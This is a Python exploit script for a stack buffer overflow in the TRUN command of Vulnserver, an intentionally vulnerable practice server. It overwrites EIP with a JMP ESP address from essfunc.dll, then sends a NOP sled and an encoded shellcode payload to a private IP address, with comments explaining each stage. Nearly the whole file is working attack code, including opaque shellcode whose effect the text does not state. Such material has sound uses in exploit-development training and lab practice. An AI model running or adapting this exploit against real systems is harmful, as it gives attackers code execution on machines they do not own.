import socket

# Define the target server IP and Port
target_ip = '192.168.68.55'
target_port = 9999

# 0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (*\vulnserver\essfunc.dll), 0x0
# The address 0x625011AF is located in the essfunc.dll library, which lacks certain protections like ASLR, Rebase, SafeSEH, and CFG. This makes it a reliable candidate for overwriting EIP.
# The address 0x625011AF is in little endian format (\xAF\x11\x50\x62)
eip_overwrite = b'\xAF\x11\x50\x62'

# This is our shellcode, designed to execute when we gain control of the instruction pointer (EIP). It's essential to ensure that your shellcode avoids bad characters.
shellcode =  b""
shellcode += b"\xba\xa6\x87\x0e\x82\xd9\xc7\xd9\x74\x24\xf4\x5b"
shellcode += b"\x29\xc9\xb1\x52\x83\xeb\xfc\x31\x53\x0e\x03\xf5"
shellcode += b"\x89\xec\x77\x05\x7d\x72\x77\xf5\x7e\x13\xf1\x10"
shellcode += b"\x4f\x13\x65\x51\xe0\xa3\xed\x37\x0d\x4f\xa3\xa3"
shellcode += b"\x86\x3d\x6c\xc4\x2f\x8b\x4a\xeb\xb0\xa0\xaf\x6a"
shellcode += b"\x33\xbb\xe3\x4c\x0a\x74\xf6\x8d\x4b\x69\xfb\xdf"
shellcode += b"\x04\xe5\xae\xcf\x21\xb3\x72\x64\x79\x55\xf3\x99"
shellcode += b"\xca\x54\xd2\x0c\x40\x0f\xf4\xaf\x85\x3b\xbd\xb7"
shellcode += b"\xca\x06\x77\x4c\x38\xfc\x86\x84\x70\xfd\x25\xe9"
shellcode += b"\xbc\x0c\x37\x2e\x7a\xef\x42\x46\x78\x92\x54\x9d"
shellcode += b"\x02\x48\xd0\x05\xa4\x1b\x42\xe1\x54\xcf\x15\x62"
shellcode += b"\x5a\xa4\x52\x2c\x7f\x3b\xb6\x47\x7b\xb0\x39\x87"
shellcode += b"\x0d\x82\x1d\x03\x55\x50\x3f\x12\x33\x37\x40\x44"
shellcode += b"\x9c\xe8\xe4\x0f\x31\xfc\x94\x52\x5e\x31\x95\x6c"
shellcode += b"\x9e\x5d\xae\x1f\xac\xc2\x04\xb7\x9c\x8b\x82\x40"
shellcode += b"\xe2\xa1\x73\xde\x1d\x4a\x84\xf7\xd9\x1e\xd4\x6f"
shellcode += b"\xcb\x1e\xbf\x6f\xf4\xca\x10\x3f\x5a\xa5\xd0\xef"
shellcode += b"\x1a\x15\xb9\xe5\x94\x4a\xd9\x06\x7f\xe3\x70\xfd"
shellcode += b"\xe8\xcc\x2d\xfc\xd9\xa4\x2f\xfe\x18\x8e\xb9\x18"
shellcode += b"\x70\xe0\xef\xb3\xed\x99\xb5\x4f\x8f\x66\x60\x2a"
shellcode += b"\x8f\xed\x87\xcb\x5e\x06\xed\xdf\x37\xe6\xb8\xbd"
shellcode += b"\x9e\xf9\x16\xa9\x7d\x6b\xfd\x29\x0b\x90\xaa\x7e"
shellcode += b"\x5c\x66\xa3\xea\x70\xd1\x1d\x08\x89\x87\x66\x88"
shellcode += b"\x56\x74\x68\x11\x1a\xc0\x4e\x01\xe2\xc9\xca\x75"
shellcode += b"\xba\x9f\x84\x23\x7c\x76\x67\x9d\xd6\x25\x21\x49"
shellcode += b"\xae\x05\xf2\x0f\xaf\x43\x84\xef\x1e\x3a\xd1\x10"
shellcode += b"\xae\xaa\xd5\x69\xd2\x4a\x19\xa0\x56\x6a\xf8\x60"
shellcode += b"\xa3\x03\xa5\xe1\x0e\x4e\x56\xdc\x4d\x77\xd5\xd4"
shellcode += b"\x2d\x8c\xc5\x9d\x28\xc8\x41\x4e\x41\x41\x24\x70"
shellcode += b"\xf6\x62\x6d"

# This is a sequence of NOP (No Operation) instructions that 'slides' the CPU to the start of the shellcode, ensuring that if EIP lands somewhere in the NOP sled, it eventually reaches the shellcode. Here, we've added a sequence of 20 NOPs before the shellcode to act as padding.
nops = b'\x90' * 20

# The buffer is constructed by sending 2006 'A's, followed by the EIP overwrite (address of JMP ESP), then the NOP sled, and finally the shellcode.
buffer = b'A' * 2006 + eip_overwrite + nops + shellcode

# Command
command = b'TRUN'
command_magic = b' .'

try:
	# Create a socket object and connect to the server
	print('Exploit> Connect to target')
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target_ip, target_port))

	# Receive the banner or welcome message from the server
	banner = s.recv(1024).decode('utf-8')
	print(f'Server> {banner}')

	# Shellcode
	print('Exploit> Sending payload')
	shell = command + command_magic + buffer
	s.send(shell)

	# Receive the response
	print('Exploit> The target server is expected to crash. No response will be received.')
	try:
		response = s.recv(1024).decode('utf-8')
		print(f'Server> {response}')
	except Exception as e:
		print(f'Exploit> No response received. The server likely crashed due to the buffer overflow.')

except Exception as e:
	# Exception handling
	print(f'An error occurred: {str(e)}')

finally:
	# Close the connection
	s.close()